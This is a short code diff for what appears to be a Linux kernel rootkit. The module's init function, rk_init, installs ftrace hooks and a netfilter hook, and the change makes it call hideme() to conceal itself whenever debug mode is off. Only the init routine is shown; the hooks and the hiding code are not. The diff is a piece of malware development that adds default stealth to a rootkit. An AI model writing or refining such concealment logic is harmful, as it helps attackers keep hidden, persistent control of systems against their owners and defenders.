@@ -8,7 +8,6 @@ static struct ftrace_hook hooks[] = {
 };
 
 static int __init rk_init(void){
-    hideme();
 
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
@@ -18,6 +17,10 @@ static int __init rk_init(void){
     if (debug == 1)
     {
         printk(KERN_INFO "poetry: loaded\n");
+    }
+    else 
+    {
+        hideme();
     }
 
     nf_register_net_hook(&init_net, &my_nfin);
